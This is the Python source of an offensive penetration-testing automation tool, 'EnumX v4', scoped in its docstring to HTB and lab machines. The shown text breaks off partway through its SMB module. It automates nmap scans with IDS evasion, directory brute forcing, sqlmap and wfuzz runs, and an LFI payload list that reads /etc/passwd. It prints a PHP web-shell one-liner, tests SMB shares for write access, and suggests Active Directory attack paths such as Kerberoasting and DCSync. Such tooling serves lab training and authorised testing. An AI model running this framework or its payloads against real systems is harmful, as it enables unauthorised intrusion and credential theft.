#!/usr/bin/env python3
"""
EnumX v4 – Full CPTS Automation Framework

⚠️  Authorized testing only. HTB/lab environments only.

New in v4:
  ✓ Session command logger (timestamp + output snippet per command)
  ✓ Machine type detection + HTB pattern hints + attack path suggestion
  ✓ wfuzz parameter fuzzing in web module
  ✓ Enhanced searchsploit: auto-pull + attempt exploit on match
  ✓ linpeas/winpeas auto-upload + run on victim
  ✓ linpeas critical findings parser
  ✓ linux-exploit-suggester integration
  ✓ Nmap progress spinner with elapsed time
  ✓ HTB-style writeup skeleton generator
  ✓ Live color-coded status summary panel
  ✓ Screenshot placeholders in report (user fills in)
"""

from __future__ import annotations

import argparse
import asyncio
import datetime as dt
import ftplib
import itertools
import os
import random
import re
import shutil
import sys
import textwrap
import threading
import time
import xml.etree.ElementTree as ET
from contextlib import closing
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ═══════════════════════════════════ COLORS ═══════════════════════════════════
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
MAGENTA= "\033[95m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

NO_COLOR = False

def c(color: str, text: str) -> str:
    return text if NO_COLOR else f"{color}{text}{RESET}"

BANNER = r"""
███████╗███╗   ██╗██╗   ██╗███╗   ███╗██╗  ██╗
██╔════╝████╗  ██║██║   ██║████╗ ████║╚██╗██╔╝
█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ╚███╔╝
██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ██╔██╗
███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗
╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
      ENUMX v4 – Full CPTS Automation Framework
"""

FOOTERS = [
    ">>> Lock. Load. Enumerate. Exploit. <<<",
    ">>> No Mercy. No Survivors. <<<",
    ">>> CPTS grind never stops. <<<",
    ">>> We own the ports, we own the system. <<<",
    ">>> Fear the enum – embrace the pwn. <<<",
]

def print_banner():
    print(c(RED, BANNER))
    print(c(random.choice([GREEN, YELLOW]), random.choice(FOOTERS)))
    print()

# ═══════════════════════════════ SESSION LOGGER ════════════════════════════════
class SessionLogger:
    def __init__(self, log_file: Path):
        self.log_file = log_file
        self.entries:  List[dict] = []
        self.log_file.write_text("# EnumX v4 Session Log\n\n", encoding="utf-8")

    def log(self, cmd: List[str], output: str, rc: int):
        ts    = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = {
            "ts":  ts,
            "cmd": " ".join(map(str, cmd)),
            "rc":  rc,
            "out": output[:800].strip(),
        }
        self.entries.append(entry)
        block = (f"\n{'─'*60}\n"
                 f"[{ts}]  RC={rc}\n"
                 f"$ {entry['cmd']}\n"
                 f"{'─'*60}\n"
                 f"{entry['out']}\n")
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(block)

SESSION_LOG: Optional[SessionLogger] = None

# ═══════════════════════════════ LIVE STATUS PANEL ═════════════════════════════
class LivePanel:
    """Non-blocking status panel printed between prompts."""
    def __init__(self):
        self._lock      = threading.Lock()
        self.module     = "Starting..."
        self.findings:  List[Tuple[str, str]] = []   # (sev, msg)
        self.creds:     List[str] = []
        self.start_time = time.time()

    def set_module(self, name: str):
        with self._lock:
            self.module = name

    def add_finding(self, sev: str, msg: str):
        with self._lock:
            self.findings.append((sev, msg))

    def add_cred(self, cred: str):
        with self._lock:
            self.creds.append(cred)

    def print(self):
        elapsed = int(time.time() - self.start_time)
        h, rem  = divmod(elapsed, 3600)
        m, s    = divmod(rem, 60)
        bar = "═" * 55
        print(c(BOLD, f"\n{bar}"))
        print(c(BOLD, f"  LIVE STATUS   ⏱ {h:02d}:{m:02d}:{s:02d}   Module: {self.module}"))
        print(c(BOLD, bar))
        with self._lock:
            if self.creds:
                print(c(RED, f"  💀 CREDS FOUND ({len(self.creds)}):"))
                for cr in self.creds[-5:]:
                    print(c(RED, f"     {cr}"))
            sev_counts: Dict[str, int] = {}
            for sev, _ in self.findings:
                sev_counts[sev] = sev_counts.get(sev, 0) + 1
            colors = {"CRITICAL": RED, "HIGH": YELLOW, "MEDIUM": CYAN, "INFO": DIM}
            for sev, cnt in sev_counts.items():
                print(c(colors.get(sev, RESET), f"  [{sev}] {cnt} finding(s)"))
            if self.findings:
                sev, last = self.findings[-1]
                print(c(DIM, f"  Last: [{sev}] {last[:60]}"))
        print(c(BOLD, bar))

PANEL = LivePanel()

# ══════════════════════════════════ UTILS ══════════════════════════════════════
def which(tool: str) -> bool:
    return shutil.which(tool) is not None

def ask(question: str) -> bool:
    PANEL.print()
    return input(c(CYAN, f"[?] {question} (y/n): ")).strip().lower() == "y"

def prompt(question: str, default: str = "") -> str:
    hint = f" [{default}]" if default else ""
    raw  = input(c(CYAN, f"[?] {question}{hint}: ")).strip()
    return raw or default

def info(msg: str):    print(c(GREEN,   f"[+] {msg}"))
def warn(msg: str):    print(c(YELLOW,  f"[!] {msg}"))
def error(msg: str):   print(c(RED,     f"[-] {msg}"))
def found(msg: str):   print(c(MAGENTA, f"[*] {msg}"))

def section(title: str):
    bar = "═" * 55
    print(c(BOLD, f"\n{bar}"))
    print(c(BOLD, f"  {title}"))
    print(c(BOLD, f"{bar}"))
    PANEL.set_module(title)

async def run_cmd(
    cmd: List[str],
    cwd:         Optional[Path] = None,
    stdout_file: Optional[Path] = None,
    extra_env:   Optional[dict] = None,
    silent:      bool = False,
) -> Tuple[int, str]:
    if not silent:
        info(f"Running: {' '.join(map(str, cmd))}")
    env  = {**os.environ, **(extra_env or {})}
    proc = await asyncio.create_subprocess_exec(
        *map(str, cmd),
        cwd=str(cwd) if cwd else None,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env=env,
    )
    out, _  = await proc.communicate()
    decoded = (out or b"").decode(errors="ignore")
    if stdout_file:
        stdout_file.write_bytes(out or b"")
    if SESSION_LOG:
        SESSION_LOG.log(cmd, decoded, proc.returncode)
    return proc.returncode, decoded

# ══════════════════════════════ CREDENTIAL MANAGER ════════════════════════════
@dataclass
class CredManager:
    creds:     List[Tuple[str, str]] = field(default_factory=list)
    userlist:  Optional[Path] = None
    passlist:  Optional[Path] = None
    domain:    str = ""
    dc_ip:     str = ""
    lm_hashes: List[str] = field(default_factory=list)

    @classmethod
    def from_file(cls, path: Path) -> "CredManager":
        cm = cls()
        if not path.exists():
            warn(f"Creds file not found: {path}")
            return cm
        for line in path.read_text().splitlines():
            line = line.strip()
            if ":" in line:
                u, p = line.split(":", 1)
                cm.creds.append((u.strip(), p.strip()))
        info(f"Loaded {len(cm.creds)} credential(s)")
        return cm

    def add(self, username: str, password: str):
        if (username, password) not in self.creds:
            self.creds.append((username, password))
            PANEL.add_cred(f"{username}:{password}")
            found(f"Credential added: {username}:{password}")

    def add_hash(self, entry: str):
        if entry not in self.lm_hashes:
            self.lm_hashes.append(entry)

# ═══════════════════════════════════ REPORT ════════════════════════════════════
class Report:
    def __init__(self, target: str, out_dir: Path):
        self.target      = target
        self.out_dir     = out_dir
        self.sections:   List[Tuple[str, str]] = []
        self.findings:   List[Tuple[str, str]] = []
        self.creds_found: List[str] = []
        self.timeline:   List[str] = []
        self.machine_type = ""

    def add_section(self, title: str, content: str):
        self.sections.append((title, content))

    def add_finding(self, finding: str, severity: str = "INFO"):
        ts = dt.datetime.now().strftime("%H:%M:%S")
        self.findings.append((severity, finding))
        self.timeline.append(f"[{ts}] [{severity}] {finding}")
        PANEL.add_finding(severity, finding)

    def add_cred(self, cred: str):
        self.creds_found.append(cred)
        PANEL.add_cred(cred)
        self.add_finding(f"Credential: {cred}", "CRITICAL")

    def save(self):
        self._save_markdown()
        self._save_html()
        self._save_writeup()

    def _save_markdown(self):
        path = self.out_dir / "report.md"
        ts   = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        md   = f"# EnumX Report – {self.target}\n\n**Generated:** {ts}  |  **Machine Type:** {self.machine_type}\n\n"
        if self.creds_found:
            md += "## 🔴 Credentials Found\n\n"
            md += "\n".join(f"- `{c}`" for c in self.creds_found) + "\n\n"
        if self.findings:
            md += "## Findings\n\n"
            icons = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","INFO":"🔵"}
            for sev, f in self.findings:
                md += f"- {icons.get(sev,'🔵')} **[{sev}]** {f}\n"
            md += "\n"
        for title, content in self.sections:
            md += f"## {title}\n\n{content}\n\n"
        path.write_text(md, encoding="utf-8")
        info(f"Markdown: {path}")

    def _save_html(self):
        path = self.out_dir / "report.html"
        ts   = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        rows = ""
        for sev, f in self.findings:
            clr = {"CRITICAL":"#ff4444","HIGH":"#ff8800","MEDIUM":"#ffcc00","INFO":"#4499ff"}.get(sev,"#4499ff")
            rows += f'<tr><td style="color:{clr};font-weight:bold">{sev}</td><td>{f}</td></tr>\n'
        cred_rows = "".join(f"<tr><td><code>{c}</code></td></tr>" for c in self.creds_found)
        tl_rows   = "".join(f"<tr><td><code>{e}</code></td></tr>" for e in self.timeline)
        html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>EnumX – {self.target}</title>
<style>
body{{background:#1e1e2e;color:#cdd6f4;font-family:monospace;padding:2rem}}
h1{{color:#cba6f7}} h2{{color:#89b4fa;border-bottom:1px solid #45475a;padding-bottom:.3rem}}
table{{border-collapse:collapse;width:100%}} td,th{{padding:.5rem 1rem;text-align:left}}
tr:nth-child(even){{background:#313244}} th{{background:#45475a}}
code{{background:#313244;padding:.1rem .4rem;border-radius:4px}}
.badge{{display:inline-block;padding:.2rem .6rem;border-radius:4px;font-size:.85em}}
</style></head><body>
<h1>EnumX Report – {self.target}</h1>
<p>Generated: {ts} | Machine: <strong>{self.machine_type}</strong></p>
{"<h2>Credentials Found</h2><table><tr><th>Credential</th></tr>"+cred_rows+"</table>" if self.creds_found else ""}
<h2>Findings</h2><table><tr><th>Severity</th><th>Finding</th></tr>{rows}</table>
<h2>Timeline</h2><table><tr><th>Event</th></tr>{tl_rows}</table>
</body></html>"""
        path.write_text(html, encoding="utf-8")
        info(f"HTML:     {path}")

    def _save_writeup(self):
        path = self.out_dir / "writeup_skeleton.md"
        creds_section = "\n".join(f"- `{c}`" for c in self.creds_found) or "_None found yet_"
        findings_hi   = "\n".join(
            f"- {f}" for sev, f in self.findings if sev in ("CRITICAL", "HIGH")
        ) or "_None_"
        writeup = f"""# HTB Writeup – {self.target}

**Machine:** {self.target}
**Type:** {self.machine_type}
**Date:** {dt.datetime.now().strftime("%Y-%m-%d")}
**Difficulty:** _fill in_

---

## Recon

### Nmap Summary

_Paste key nmap findings here._

### Services Discovered

_Add screenshot: `[screenshot: nmap_results.png]`_

---

## Foothold

### What I Found

{findings_hi}

### How I Exploited It

_Describe the vulnerability and exploitation steps._

```bash
# Key commands used:
# (see session_log.txt for full command history)
```

_Add screenshot: `[screenshot: initial_access.png]`_

---

## Privilege Escalation

### Enumeration

_Describe what linpeas/manual enum revealed._

_Add screenshot: `[screenshot: privesc_enum.png]`_

### Exploitation

_Describe how you escalated._

```bash
# PrivEsc commands:
```

_Add screenshot: `[screenshot: root_proof.png]`_

---

## Credentials Found

{creds_section}

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | _fill in_ |
| root.txt | _fill in_ |

---

## Key Takeaways

- _What was the entry point?_
- _What was the privesc vector?_
- _What would have been missed without thorough enumeration?_

---
_Generated by EnumX v4_
"""
        path.write_text(writeup, encoding="utf-8")
        info(f"Writeup:  {path}")

# ══════════════════════════════ MACHINE PROFILER ═══════════════════════════════
@dataclass
class MachineProfile:
    machine_type:  str
    os_guess:      str
    htb_hints:     List[str]
    attack_path:   List[str]

def profile_machine(services: List[Service]) -> MachineProfile:
    ports   = {s.port for s in services}
    snames  = " ".join(s.name.lower() for s in services)

    # ── Machine type ──────────────────────────────────────────────────────────
    if 88 in ports and 389 in ports and 445 in ports:
        mtype = "Windows Active Directory Domain Controller"
        os_g  = "Windows Server"
        path  = [
            "① Kerbrute – validate/enumerate users",
            "② AS-REP Roasting – users without pre-auth",
            "③ Password spraying via netexec",
            "④ Kerberoasting – crack service ticket hashes",
            "⑤ BloodHound – find attack paths to DA",
            "⑥ DCSync / NTDS.dit dump",
        ]
    elif 1433 in ports:
        mtype = "Windows MSSQL Server"
        os_g  = "Windows Server"
        path  = [
            "① Default creds (sa / empty pass)",
            "② xp_cmdshell for RCE",
            "③ Hash capture via xp_dirtree + Responder",
            "④ Lateral movement via SMB/WinRM",
        ]
    elif 445 in ports and 3389 in ports:
        mtype = "Windows Workstation / Server"
        os_g  = "Windows"
        path  = [
            "① SMB null session / share enum",
            "② Credential spray (netexec)",
            "③ RDP brute force",
            "④ Pass-the-Hash if hashes obtained",
        ]
    elif 445 in ports:
        mtype = "Windows (SMB Only Exposed)"
        os_g  = "Windows"
        path  = [
            "① SMB null session + enum4linux-ng",
            "② MS17-010 EternalBlue check",
            "③ Credential spray",
        ]
    elif (80 in ports or 443 in ports or 8080 in ports or 8443 in ports) and 22 in ports:
        mtype = "Linux Web Server"
        os_g  = "Linux"
        path  = [
            "① Fingerprint tech (whatweb)",
            "② Directory brute (gobuster/feroxbuster)",
            "③ Vulnerability scan (nikto)",
            "④ SQLi (sqlmap) / LFI / SSTI probing",
            "⑤ Upload web shell → reverse shell",
            "⑥ LinPEAS + privilege escalation",
        ]
    elif 21 in ports:
        mtype = "FTP Server"
        os_g  = "Unknown"
        path  = [
            "① Anonymous FTP login",
            "② Download all accessible files",
            "③ Brute force if anon fails",
        ]
    else:
        mtype = "Mixed / Unknown"
        os_g  = "Unknown"
        path  = ["Follow service-by-service enumeration order"]

    # ── HTB-specific hints ────────────────────────────────────────────────────
    hints: List[str] = []
    std_ports = {21,22,23,25,53,80,110,135,139,143,389,443,445,
                 636,993,995,1433,3268,3306,3389,5432,5985,8080,8443,88}
    unusual = sorted(ports - std_ports)
    if unusual:
        hints.append(f"Non-standard ports {unusual} → custom web app or service, enumerate carefully")
    specials = {
        9200:  "Elasticsearch → check unauthenticated access + data dump",
        27017: "MongoDB → check unauthenticated access",
        6379:  "Redis → check unauth write (RCE via cron/authorized_keys)",
        2375:  "Docker API (unencrypted) → container escape / host RCE",
        2376:  "Docker API (TLS) → try with no client cert",
        5985:  "WinRM (HTTP) → try evil-winrm with any creds found",
        5986:  "WinRM (HTTPS) → try evil-winrm -S flag",
        11211: "Memcached → dump cache for credentials/session tokens",
        4369:  "Erlang Port Mapper → RabbitMQ cookie attack",
        8500:  "Consul → check unauthenticated API",
        2049:  "NFS → check showmount -e and mount without auth",
        111:   "RPC portmapper → enumerate RPC services",
        8888:  "Jupyter Notebook → often no auth on HTB machines",
    }
    for port, hint in specials.items():
        if port in ports:
            hints.append(hint)
    if 80 in ports and len([p for p in ports if p > 1024]) > 3:
        hints.append("Multiple high ports + web → check each port for different web apps")
    if not hints:
        hints.append("No unusual patterns detected – follow standard methodology")

    return MachineProfile(mtype, os_g, hints, path)

def print_profile(profile: MachineProfile):
    section("Machine Profile & Attack Path")
    print(c(BOLD,    f"  Type   : ") + c(MAGENTA, profile.machine_type))
    print(c(BOLD,    f"  OS     : ") + c(CYAN,    profile.os_guess))
    print()
    print(c(YELLOW,  "  HTB Hints:"))
    for h in profile.htb_hints:
        print(c(YELLOW, f"    ⚡ {h}"))
    print()
    print(c(GREEN,   "  Suggested Attack Path:"))
    for step in profile.attack_path:
        print(c(GREEN, f"    {step}"))
    print()

# ══════════════════════════════════ NMAP ═══════════════════════════════════════
@dataclass
class Service:
    port: int; proto: str; name: str
    product: Optional[str]; version: Optional[str]
    def label(self) -> str:
        return " ".join(p for p in [self.name, self.product, self.version] if p)

def parse_nmap_xml(xml_path: Path) -> List[Service]:
    services: List[Service] = []
    for host in ET.parse(xml_path).getroot().findall("host"):
        for ports in host.findall("ports"):
            for port in ports.findall("port"):
                state = port.find("state")
                if state is None or state.get("state") != "open":
                    continue
                svc = port.find("service")
                services.append(Service(
                    port=int(port.get("portid")),
                    proto=port.get("protocol", "tcp"),
                    name=(svc.get("name") if svc is not None else None) or "unknown",
                    product=svc.get("product") if svc is not None else None,
                    version=svc.get("version") if svc is not None else None,
                ))
    return services

def _spinner(label: str, stop_event: threading.Event):
    frames = itertools.cycle(["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"])
    start  = time.time()
    while not stop_event.is_set():
        elapsed = int(time.time() - start)
        m, s    = divmod(elapsed, 60)
        sys.stdout.write(f"\r  {next(frames)}  {label}  [{m:02d}:{s:02d} elapsed] ")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 60 + "\r")
    sys.stdout.flush()

async def run_nmap(target: str, out_dir: Path) -> Optional[Path]:
    if not which("nmap"):
        warn("nmap not found")
        return None
    xml = out_dir / "nmap.xml"
    txt = out_dir / "nmap.txt"

    section("Nmap Scan Configuration")
    print(f"  {c(CYAN,'1)')} Full scan   -p-  (all 65535 ports) – thorough, slower")
    print(f"  {c(CYAN,'2)')} Quick scan  (top 1000 ports)       – fast start")
    print(f"  {c(CYAN,'3)')} Custom      (you specify ports)")
    choice = input(c(CYAN, "[?] Scan type [1/2/3]: ")).strip()

    extra_flags: List[str] = []
    if choice == "2":
        port_arg   = ["--top-ports", "1000"]
        scan_label = "Quick (top 1000)"
    elif choice == "3":
        ports_in   = prompt("Ports (e.g. 22,80,443 or 1-10000)", "1-65535")
        port_arg   = ["-p", ports_in]
        scan_label = f"Custom ({ports_in})"
    else:
        port_arg   = ["-p-"]
        scan_label = "Full (-p-)"

    if ask("Enable IDS/firewall evasion (decoys + fragmentation)?"):
        extra_flags += ["-D", "RND:5", "-f"]

    cmd = ["nmap"] + port_arg + ["-sV", "-sC", "-A", "-O"] + extra_flags + \
          ["-oX", str(xml), "-oN", str(txt), target]

    info(f"Starting {scan_label} nmap scan...")
    stop = threading.Event()
    spinner = threading.Thread(target=_spinner, args=(f"nmap {scan_label}", stop), daemon=True)
    spinner.start()

    rc, _ = await run_cmd(cmd, silent=True)
    stop.set()
    spinner.join()

    if rc != 0 or not xml.exists():
        warn("nmap failed")
        return None
    info("Nmap complete")

    # ── Optional UDP scan ─────────────────────────────────────────────────────
    if ask("Also run UDP scan? (top 20 ports, requires sudo)"):
        udp_top  = prompt("Number of top UDP ports to scan", "20")
        udp_xml  = out_dir / "udp.xml"
        udp_txt  = out_dir / "udp.txt"
        udp_cmd  = ["sudo", "nmap", "-sU", "--top-ports", udp_top,
                    "-oX", str(udp_xml), "-oN", str(udp_txt), target]
        info(f"Starting UDP scan (top {udp_top} ports)...")
        stop_u  = threading.Event()
        spin_u  = threading.Thread(target=_spinner, args=(f"nmap UDP top-{udp_top}", stop_u), daemon=True)
        spin_u.start()
        await run_cmd(udp_cmd, silent=True)
        stop_u.set()
        spin_u.join()
        if udp_xml.exists():
            info("UDP scan complete")
        else:
            warn("UDP scan failed or returned no results")

    return xml

# ══════════════════════════════════ RECON ══════════════════════════════════════
async def recon_extras(target: str, out_dir: Path, report: Report):
    section("Extra Recon")
    recon_dir = out_dir / "recon"
    recon_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    if which("wafw00f") and ask("WAF detection (wafw00f)?"):
        tasks.append(run_cmd(["wafw00f", target], stdout_file=recon_dir / "wafw00f.txt"))
        report.add_finding("WAF detection run")

    if ask("DNS records (dig any)?"):
        tasks.append(run_cmd(["dig", "any", target], stdout_file=recon_dir / "dns.txt"))

    if ask("CRT.sh subdomain enum?"):
        tasks.append(run_cmd(
            ["curl", "-s", f"https://crt.sh/?q={target}&output=json"],
            stdout_file=recon_dir / "crtsh.json",
        ))
        report.add_finding("CRT.sh subdomain enum")

    if which("gobuster") and ask("VHOST brute force (gobuster)?"):
        wl = prompt("Wordlist", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt")
        tasks.append(run_cmd(
            ["gobuster", "vhost", "-u", f"http://{target}", "-w", wl, "--append-domain"],
            stdout_file=recon_dir / "vhosts.txt",
        ))
        report.add_finding("VHOST brute force run")

    if tasks:
        await asyncio.gather(*tasks)

# ════════════════════════════════ WEB ATTACKS ══════════════════════════════════
async def enum_http(target: str, ports: List[int], out_dir: Path, report: Report):
    section(f"Web Attacks  –  ports {ports}")
    web_dir = out_dir / "web"
    web_dir.mkdir(parents=True, exist_ok=True)
    tasks = []

    for p in ports:
        scheme = "https" if p in (443, 8443) else "http"
        url    = f"{scheme}://{target}" if p in (80, 443) else f"{scheme}://{target}:{p}"

        if which("whatweb") and ask(f"whatweb {url}?"):
            tasks.append(run_cmd(["whatweb", "-a", "3", url],
                                  stdout_file=web_dir / f"whatweb_{p}.txt"))
            report.add_finding(f"whatweb on {url}")

        if which("gobuster") and ask(f"gobuster dir on {url}?"):
            wl  = prompt("Wordlist", "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt")
            ext = prompt("Extensions", "php,html,txt,js,json")
            tasks.append(run_cmd(
                ["gobuster", "dir", "-u", url, "-w", wl, "-x", ext,
                 "-o", str(web_dir / f"gobuster_{p}.txt")],
            ))
            report.add_finding(f"gobuster dir on {url}")

        if which("feroxbuster") and ask(f"feroxbuster recursive on {url}?"):
            wl = prompt("Wordlist", "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt")
            tasks.append(run_cmd(
                ["feroxbuster", "-u", url, "-w", wl, "-o", str(web_dir / f"ferox_{p}.txt")],
            ))
            report.add_finding(f"feroxbuster on {url}")

        if which("nikto") and ask(f"nikto on {url}?"):
            tasks.append(run_cmd(
                ["nikto", "-h", url, "-o", str(web_dir / f"nikto_{p}.txt")],
            ))
            report.add_finding(f"nikto on {url}")

        if which("wfuzz") and ask(f"wfuzz parameter fuzzing on {url}?"):
            wl       = prompt("Wordlist", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt")
            fuzz_url = prompt(f"URL with FUZZ placeholder", f"{url}/index.php?FUZZ=test")
            hc       = prompt("Hide response codes (comma-separated)", "404,403")
            tasks.append(run_cmd(
                ["wfuzz", "-c", "-w", wl, "--hc", hc, fuzz_url],
                stdout_file=web_dir / f"wfuzz_{p}.txt",
            ))
            report.add_finding(f"wfuzz param fuzz on {fuzz_url}", "MEDIUM")

        if which("sqlmap") and ask(f"sqlmap SQLi on {url}?"):
            sqli_url = prompt("Full URL with param (e.g. http://host/page?id=1)", url)
            tasks.append(run_cmd(
                ["sqlmap", "-u", sqli_url, "--batch", "--level", "3",
                 "--risk", "2", "--output-dir", str(web_dir / f"sqlmap_{p}")],
            ))
            report.add_finding(f"sqlmap on {sqli_url}", "HIGH")

        if ask(f"LFI probe on {url}?"):
            param    = prompt("Vulnerable parameter", "file")
            lfi_paths = ["../../etc/passwd","../../../../etc/passwd",
                         "/etc/passwd","....//....//etc/passwd",
                         "..%2F..%2Fetc%2Fpasswd","/proc/self/environ"]
            lfi_out  = []
            for lp in lfi_paths:
                test = f"{url}?{param}={lp}"
                rc, out = await run_cmd(["curl", "-s", "-m", "5", test], silent=True)
                if "root:" in out or "bin:x" in out:
                    lfi_out.append(f"[VULN] {test}")
                    report.add_finding(f"LFI confirmed: {test}", "CRITICAL")
                    found(f"LFI CONFIRMED: {test}")
                else:
                    lfi_out.append(f"[miss] {test}")
            (web_dir / f"lfi_{p}.txt").write_text("\n".join(lfi_out), encoding="utf-8")

        if ask(f"Test web shell on {url}?"):
            info("Shells: PHP=<?php system($_REQUEST['cmd']); ?>  JSP/ASP available")
            shell_path = prompt("Remote shell path if uploaded (or Enter to skip)", "")
            if shell_path:
                test_url = f"{url}/{shell_path}?cmd=id"
                rc, out  = await run_cmd(["curl", "-s", test_url], silent=True)
                if "uid=" in out:
                    found(f"Web shell active: {test_url}")
                    report.add_cred(f"WebShell:{test_url}")
                    report.add_finding(f"Web shell confirmed: {test_url}", "CRITICAL")

    if tasks:
        await asyncio.gather(*tasks)

# ════════════════════════════════════ SMB ══════════════════════════════════════
def _parse_shares_smbclient(output: str) -> List[str]:
    """Extract share names from smbclient -L output."""
    shares = []
    for line in output.splitlines():
        m = re.match(r'\s+(\S+)\s+(Disk|IPC|Printer)\b', line)
        if m:
            shares.append(m.group(1))
    return shares

def _parse_shares_netexec(output: str) -> Dict[str, str]:
    """Extract {share: permissions} from netexec/crackmapexec --shares output."""
    result: Dict[str, str] = {}
    capture = False
    for line in output.splitlines():
        if re.search(r'Share\s+Permissions', line, re.IGNORECASE):
            capture = True
            continue
        if re.search(r'-{3,}', line) and capture:
            continue
        if capture and line.strip():
            # Line format (after SMB host port hostname prefix):
            # e.g. "SMB 10.10.10.1 445 DC01 Users READ ..."
            parts = line.split()
            # Strip leading tool-prefix tokens (SMB / IP / PORT / HOSTNAME)
            idx = 0
            for i, p in enumerate(parts):
                if re.match(r'\d+\.\d+\.\d+\.\d+', p) or p in ("SMB","RDP","LDAP","445","139"):
                    idx = i
            clean = parts[idx + 1:]  # after last prefix token
            if not clean:
                continue
            share_name = clean[0]
            perms = clean[1] if len(clean) > 1 else ""
            # Permissions like READ,WRITE or empty
            if re.match(r'^(READ|WRITE|NO ACCESS|$)', perms, re.IGNORECASE):
                result[share_name] = perms or "NO ACCESS"
            else:
                result[share_name] = ""
    return result

async def _test_share(target: str, share: str, user: str, password: str) -> Tuple[bool, str]:
    """Try to list a share and return (success, first_line_of_output)."""
    if not which("smbclient"):
        return False, ""
    rc, out = await run_cmd(
        ["smbclient", f"//{target}/{share}", "-U", f"{user}%{password}", "-c", "ls"],
        silent=True,
    )
    if rc == 0:
        first = next((l.strip() for l in out.splitlines() if l.strip()), "")
        return True, first
    return False, ""

async def enum_smb(target: str, out_dir: Path, creds: CredManager, report: Report):
    section("SMB Enumeration & Attacks")
    smb_dir = out_dir / "smb"
    smb_dir.mkdir(parents=True, exist_ok=True)

    discovered_shares: List[str] = []
    tool = "netexec" if which("netexec") else ("crackmapexec" if which("crackmapexec") else None)

    # ── Step 1: Discover all shares (null + each credential) ─────────────────
    info("Discovering shares (null session)...")
    if which("smbclient"):
        rc, null_out = await run_cmd(
            ["smbclient", "-L", f"//{target}/", "-N"], silent=True,
        )
        (smb_dir / "shares_null.txt").write_text(null_out, encoding="utf-8")
        discovered_shares += _parse_shares_smbclient(null_out)

    if tool and creds.creds:
        for u, p in creds.creds:
            rc, cred_out = await run_cmd(
                [tool, "smb", target, "-u", u, "-p", p, "--shares"],
                stdout_file=smb_dir / f"shares_{u}.txt",
                silent=True,
            )
            for share, perms in _parse_shares_netexec(cred_out).items():
                if share not in discovered_shares:
                    discovered_shares.append(share)

    discovered_shares = list(dict.fromkeys(discovered_shares))  # deduplicate, preserve order

    if discovered_shares:
        found(f"Shares discovered: {discovered_shares}")
    else:
        warn("No shares discovered")

    # ── Step 2: Build access matrix (each user × each share) ─────────────────
    # identity list: (label, user, password)
    identities: List[Tuple[str, str, str]] = [("anonymous", "", "")]
    for u, p in creds.creds:
        identities.append((u, u, p))

    # access_matrix[share][label] = "READ" | "READ/WRITE" | "NO ACCESS" | "-"
    access_matrix: Dict[str, Dict[str, str]] = {s: {} for s in discovered_shares}

    if discovered_shares and which("smbclient"):
        info("Testing credential × share access matrix...")
        tasks_map: List[Tuple[str, str, asyncio.Task]] = []
        for share in discovered_shares:
            for label, u, p in identities:
                t = asyncio.create_task(_test_share(target, share, u, p))
                tasks_map.append((share, label, t))

        for share, label, t in tasks_map:
            ok, _ = await t
            if ok:
                # Check write access
                write_ok = False
                if which("smbclient"):
                    passwd = next((pw for lbl, _, pw in identities if lbl == label), "")
                    tmp_name = f"enumx_write_test_{random.randint(1000,9999)}"
                    rw_rc, _ = await run_cmd(
                        ["smbclient", f"//{target}/{share}",
                         "-U", f"{label}%{passwd}",
                         "-c", f"put /etc/hostname {tmp_name}; del {tmp_name}"],
                        silent=True,
                    )
                    write_ok = rw_rc == 0
                access_matrix[share][label] = "READ/WRITE" if write_ok else "READ"
                found(f"  {label} → \\\\{target}\\{share}  [{access_matrix[share][label]}]")
            else:
                access_matrix[share][label] = "-"

    # ── Step 3: Browse readable shares and collect file listings ─────────────
    share_contents: Dict[str, Dict[str, str]] = {}  # share → {identity: listing}
    for share in discovered_shares:
        share_contents[share] = {}
        for label, u, p in identities:
            if access_matrix[share].get(label, "-") in ("READ", "READ/WRITE"):
                rc, listing = await run_cmd(
                    ["smbclient", f"//{target}/{share}", "-U", f"{u}%{p}",
                     "-c", "ls"],
                    silent=True,
                )
                if rc == 0:
                    share_contents[share][label] = listing
                    out_file = smb_dir / f"listing_{share}_{label}.txt"
                    out_file.write_text(listing, encoding="utf-8")

    # ── Step 4: Build report section ─────────────────────────────────────────
    id_labels = [lab for lab, _, _ in identities]

    # Markdown table
    header = "| Share | " + " | ".join(id_labels) + " |"
    sep    = "|-------|" + "|".join(["--------"] * len(id_labels)) + "|"
    rows   = []
    for share in discovered_shares:
        cells = [access_matrix[share].get(lab, "-") for lab in id_labels]
        rows.append(f"| {share} | " + " | ".join(cells) + " |")

    md_table = "\n".join([header, sep] + rows)

    # File listing details
    listing_details = ""
    for share in discovered_shares:
        for label, listing in share_contents.get(share, {}).items():
            listing_details += f"\n### \\\\{target}\\{share}  (as {label})\n\n```\n{listing[:1500]}\n```\n"

    smb_section = f"## SMB Share Access Matrix\n\n{md_table}\n\n{listing_details}"
    report.add_section("SMB Shares & Access", smb_section)

    # Add high-value findings
    for share in discovered_shares:
        for label, access in access_matrix[share].items():
            if access in ("READ", "READ/WRITE"):
                sev = "HIGH" if access == "READ/WRITE" else "MEDIUM"
